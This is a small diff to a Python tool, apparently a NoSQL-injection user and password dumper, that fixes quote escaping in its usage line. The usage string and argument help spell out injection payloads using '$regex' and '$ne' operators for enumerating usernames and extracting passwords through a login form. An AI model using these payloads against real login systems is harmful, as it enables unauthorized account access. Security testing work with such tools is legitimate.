@@ -44,7 +44,7 @@ def brute_password(payload, username):
     return password
 
 if __name__ == '__main__':
-    print("USAGE: python3 nosqldump.py -p "username[\$regex]=^{}&password[\$ne]=tamtam&login=login" -u user1 -u USER2\n For password enum use username={}&passowrd[\$regex]={{}}...."
+    print("USAGE: python3 nosqldump.py -p \"username[\$regex]=^{}&password[\$ne]=tamtam&login=login\" -u user1 -u USER2\n For password enum use username={}&passowrd[\$regex]={{}}...."
     parser = argparse.ArgumentParser()
     parser.add_argument('-p','--payload', required=True, type=str, help="payload to inject. should have {} for user enumeration and have {} and {{}} for password dump")
     parser.add_argument('-u','--usernames', required=True, action='append', help="usernames like: '-u user -u anotheruser'")
